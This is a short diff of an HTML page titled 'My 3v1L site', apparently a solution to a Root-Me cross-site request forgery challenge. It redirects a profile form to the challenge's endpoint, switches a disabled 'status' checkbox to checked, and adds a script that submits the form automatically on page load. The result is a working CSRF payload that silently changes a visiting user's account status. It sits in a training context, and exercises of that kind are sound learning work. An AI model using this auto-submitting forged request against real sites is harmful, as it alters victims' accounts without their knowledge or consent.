@@ -36,7 +36,7 @@ xmlhttp.send(post_data);
 </head>
 <body>
 <h1>My 3v1L site</h1>
-<form action="?action=profile" method="post" enctype="multipart/form-data">
+<form name="myform" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
 <div class="form-group">
 <label>Username:</label>
 <input type="text" name="username" value="toto">
@@ -44,11 +44,14 @@ xmlhttp.send(post_data);
 <br>		
 <div class="form-group">
 <label>Status:</label>
-<input type="checkbox" name="status" disabled >
+<input type="checkbox" name="status" enable="" checked="checked">
 </div>
 <br>	
 <button type="submit">Submit</button>
 </form>
-		
+<script type="text/javascript">
+document.myform.submit();
+</script>
+
 </body></html>
 
